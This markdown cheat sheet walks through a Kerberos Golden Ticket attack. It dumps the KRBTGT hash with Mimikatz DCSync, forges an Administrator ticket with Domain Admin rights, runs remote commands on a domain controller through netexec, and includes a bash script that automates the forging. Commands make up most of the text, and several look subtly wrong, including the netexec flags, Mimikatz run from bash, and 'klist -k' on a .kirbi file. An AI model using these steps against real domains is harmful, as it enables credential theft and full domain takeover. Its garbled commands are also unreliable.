
# Golden Ticket Attack & Usage with Netexec

## Prerequisites

- Administrative privileges on the target domain controller.
- Tools: Mimikatz, PowerShell, netexec.

## Step 1: Dump the KRBTGT Hash (On Victim Machine - PowerShell)
1. Use Mimikatz to extract the **KRBTGT** hash:
   ```powershell
   mimikatz # lsadump::dcsync /domain:<DOMAIN_NAME> /user:krbtgt
   ```

   - Replace `<DOMAIN_NAME>` with the target domain name.
   - Copy the **NTLM** hash of the KRBTGT user.

## Step 2: Generate the Golden Ticket (On Kali - Bash)
1. Create the golden ticket using Mimikatz:
   ```bash
   mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN_NAME> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /id:<USER_ID> /groups:<GROUP_IDS> /endin:20250501 /renewmax:20250601 /target:<DC_NAME> /ticket:<TICKET_FILE>.kirbi
   ```

   - `<USERNAME>`: The account name to impersonate (typically `Administrator`).
   - `<DOMAIN_NAME>`: Domain name.
   - `<DOMAIN_SID>`: The SID of the domain.
   - `<KRBTGT_HASH>`: The NTLM hash of the KRBTGT account.
   - `<USER_ID>`: The RID of the user (default is `500` for Administrator).
   - `<GROUP_IDS>`: Add necessary group RIDs (like `512` for Domain Admin).
   - `<DC_NAME>`: Domain Controller name.
   - `<TICKET_FILE>`: Name of the output ticket file.

## Step 3: Validate the Ticket (On Kali - Bash)
1. Verify the saved ticket with `klist`:
   ```bash
   klist -k <TICKET_FILE>.kirbi
   ```

## Step 4: Use `netexec` with the Golden Ticket (On Kali - Bash)
1. Use `netexec` to execute commands on the remote machine using the saved ticket:
   ```bash
   netexec -r <DC_NAME> -u <DOMAIN>\<USERNAME> -d <COMMAND> --ticket=<TICKET_FILE>.kirbi
   ```

   - `<DC_NAME>`: Domain Controller or target machine name.
   - `<DOMAIN>`: The domain name.
   - `<USERNAME>`: The user you impersonated (e.g., `Administrator`).
   - `<COMMAND>`: The command to execute on the target.
   - `<TICKET_FILE>`: The generated golden ticket file.

Example:
   ```bash
   netexec -r DC01 -u MYDOMAIN\Administrator -d "cmd /c whoami" --ticket=golden_ticket.kirbi
   ```

## Automated Script for Generating Golden Ticket (On Kali - Bash)

1. Here’s a script that automates the generation of the golden ticket and saves it as a file.

   ```bash
   #!/bin/bash

   # Variables
   DOMAIN_NAME="MYDOMAIN"
   USERNAME="Administrator"
   DOMAIN_SID="S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX"
   KRBTGT_HASH="XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
   DC_NAME="DC01"
   TICKET_FILE="golden_ticket.kirbi"

   # Generate Golden Ticket
   echo "Generating Golden Ticket..."
   mimikatz "kerberos::golden /user:${USERNAME} /domain:${DOMAIN_NAME} /sid:${DOMAIN_SID} /krbtgt:${KRBTGT_HASH} /id:500 /groups:512 /endin:20250501 /renewmax:20250601 /target:${DC_NAME} /ticket:${TICKET_FILE}"

   echo "Golden Ticket saved as ${TICKET_FILE}"
   ```

This script automates the golden ticket creation process, saving the output to a file.

---

**Note:** Use this information only for authorized penetration testing or legal assessments.

--- 
